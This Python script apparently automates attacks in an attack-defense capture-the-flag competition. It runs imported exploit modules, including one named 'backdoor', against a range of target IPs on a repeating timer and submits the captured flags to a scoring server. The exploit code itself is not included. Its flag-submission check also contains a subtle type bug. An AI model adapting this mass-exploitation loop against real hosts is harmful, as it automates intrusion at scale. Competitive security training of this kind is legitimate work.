#! /usr/bin/env python3
# -*- encoding: utf-8 -*-
'''
@File    : FuckAll.py
@Time    : 2021/06/21 Mon 23:47:16
@Author  : Wh1sper
@Desc    : Usage:

    .
    |-- FuckAll.py
    |-- exp
    |  |-- __init__.py
    |  |-- your_exp1.py
    |  |-- your_exp2.py

1. from exp import your_exp1.py, your_exp2.py
2. add to Exp_list: append(your_exp1.GetFlag, your_exp2.GetFlag)
3. Restart script
'''

import requests
from time import sleep, strftime
from exp import backdoor

Submit_URL = r""
Token = r""

TargetList = [f"172.16.{ip}.16" for ip in range(1)]
Port = 9999
Exp_List = [backdoor.GetFlag] # @add

def Submit_Flag(_flag: str or bytes):
    # r = requests.get(Submit_URL, params={"token": Token, "flag": _flag}, timeout=0.5)
    r = requests.post(Submit_URL, data={"token": Token, "flag": _flag}, timeout=0.5)
    print(r)
    if "success" in r:
        return True
    return False

if __name__ == '__main__':
    while True:
        Success = 0
        for ip in TargetList:
            print(f"{ip}:{Port}$ ", end="")
            Flag = None
            for Attack in Exp_List:
                try:
                    Flag = Attack(ip, Port)
                except TypeError:
                    print("TypeError. Invalid method.")
                    exit(-1)
                except Exception:
                    print("E. ", end="")
                    pass
                if Flag != None:
                    try:
                        if Submit_Flag(Flag):
                            print(f"Attacked via {Attack.__name__}.")
                            Success += 1
                            break
                    except Exception:
                        print("An exception occurred while submitting flag.")
        print(f"[{strftime('%H:%M:%S')}] Success: {Success}/{len(TargetList)}")
        try:
            sleep(23)
        except KeyboardInterrupt:
            print("\nInterrupt.")
            break

Refresh_Min = 5
Refresh_Sec = 0
Period = 5
def SetTimer(): # TODO: 定时器：在换flag前打一波
    pass
